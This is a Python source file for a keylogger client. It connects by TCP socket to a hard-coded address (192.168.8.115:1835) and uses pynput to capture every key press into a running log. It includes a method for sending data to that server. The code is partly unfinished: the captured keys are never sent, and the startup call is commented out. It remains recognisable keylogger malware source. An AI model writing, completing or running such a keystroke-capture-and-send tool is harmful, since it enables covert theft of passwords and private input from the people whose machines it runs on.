import socket
import sys
from pynput import keyboard
import threading
import logging
import json
import time
from typing import List



SEND_BUF_SIZE = 4096
RECV_BUF_SIZE = 4096
host = '192.168.8.115'

logging.basicConfig(
    level=logging.ERROR,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler("clientErrors.log")]
)

def makeRed(e):
    print(f"\033[91mError: {e}\033[0m")

def logError(error):
    makeRed(error)
    logging.exception("\n")


#clientSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
class ClientServer:
    def __init__(self, host='192.168.8.115', port=1835, clientSock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)):
        self.host = host
        self.port = port
        self.clientSock = clientSock
        server_address = (self.host, self.port)
        print("Attempting connection")
        self.clientSock.connect(server_address)
        print(f"Connected to {server_address[0]} port {server_address[1]}")

    def startClient(self):
        try:
            if self.clientSock:
                message = 'socket already exists(?)'
                self.clientSock.send(message.encode('ascii'))
                # Start listener thread once the connection is ready
                listener = Listener(self)
                listener.start_listener()

        except ConnectionRefusedError as e:
            makeRed("Connection refused")
            logging.exception("\n")
        #except socket.timeout:
        #    print("Socket timed out")
        #    logging.exception("\n")
        #except socket.gaierror:
        #    makeRed("Address-related error! The server address is invalid.")
       #     logging.exception("\n")
       # except Exception as e:
       #     print(f"Error: {e}")
       #     logging.exception("\n")

    def sendToServer(self, args:List[str]):
        if self.clientSock:
            #message = 'socket already exists(?)'
            #self.clientSock.send(message.encode('ascii'))
            self.clientSock.sendall(args.encode('ascii'))
        else:
            makeRed("Error: clientSock is not initialized.")
            logging.error("Attempted to send data without a valid clientSock.")

    def closeServer(self):
        if self.clientSock:
            print("Closing server")
            self.clientSock.close()
            sys.exit(1)

class Listener:
    def __init__(self, server: ClientServer):
        self.listener_thread = None
        self.listener_running = False
        self.server = server
        self.log = ""

    def start_listener(self):
        if not self.listener_running:
            self.listener_thread = threading.Thread(target=self.listen)
            self.listener_thread.start()
            self.listener_running = True

    def listen(self):
        with keyboard.Listener(on_press=self.on_key_press) as listener:
            listener.join()

    def on_key_press(self, key):
        newkey = key.char if hasattr(key, 'char') else str(key)
        self.log += newkey

        try:
            if key == keyboard.Key.esc:
                self.server.closeServer()
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "  
                print(f"log with space: {self.log}")   
        except OSError as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    server = ClientServer()
    #server.startClient()  # Ensure this is the first call to establish connection
